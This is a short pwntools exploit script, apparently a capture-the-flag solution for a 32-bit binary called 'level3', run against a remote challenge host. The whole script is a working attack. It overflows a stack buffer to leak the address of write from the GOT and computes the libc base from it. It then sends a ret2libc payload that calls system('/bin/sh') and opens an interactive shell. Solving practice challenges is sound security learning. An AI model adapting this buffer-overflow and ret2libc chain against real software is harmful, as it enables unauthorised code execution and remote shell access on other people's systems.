from pwn import *

context.log_level='debug'
# sh = process("./level3")  # 本地不行
sh = remote("61.147.171.105", 57351)
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt['write']
write_got = elf.got['write']
vul_addr = elf.symbols['vulnerable_function']

sh.recv()
payload1 = cyclic(0x8c) + p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(4)
sh.sendline(payload1)
write_addr = u32(sh.recv(4))
print(hex(write_addr))

base_libc = write_addr - libc.symbols['write']
system = base_libc + libc.symbols['system']
binsh = base_libc + next(libc.search(b'/bin/sh'))
print("base_libc:" + str(hex(base_libc)))
print("system:" + str(hex(system)))
print("binsh:" + str(hex(binsh)))

payload2 = cyclic(0x8c) + p32(system) + b'b'*4 + p32(binsh)
sh.sendline(payload2)
sh.interactive()
